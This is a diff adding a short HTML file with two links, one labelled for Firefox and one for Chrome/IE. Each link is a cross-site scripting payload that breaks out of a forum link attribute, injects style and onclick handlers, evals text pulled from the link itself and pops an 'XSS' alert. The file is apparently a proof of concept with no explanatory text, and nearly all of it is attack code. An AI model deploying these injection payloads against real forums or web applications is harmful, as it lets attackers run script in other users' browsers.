@@ -1,0 +1,6 @@
+﻿<html>
+	<body>
+Firefox: <a class="m" href="/Forum/Info/wiki.humour&quot;style=&quot;display:inline-block;overflow:hidden;width:6em;height:1em&quot;onclick=&quot;eval(this.textContent.substring(124));alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83));a.aspx" target="_blank">wiki.humour"style="display:inline-block;overflow:hidden;width:6em;height:1em"onclick="eval(this.textContent.substring(124));alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83));a</a><br />
+Chrome/IE: <a class="m" href="/Forum/Info/wiki.humour&quot;style=&quot;display:inline-block;overflow:hidden;width:6em;height:1em&quot;onclick=&quot;eval(this.innerText.substring(122));alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83));a.aspx" target="_blank">wiki.humour"style="display:inline-block;overflow:hidden;width:6em;height:1em"onclick="eval(this.innerText.substring(122));alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83));a</a>
+	</body>
+</html>
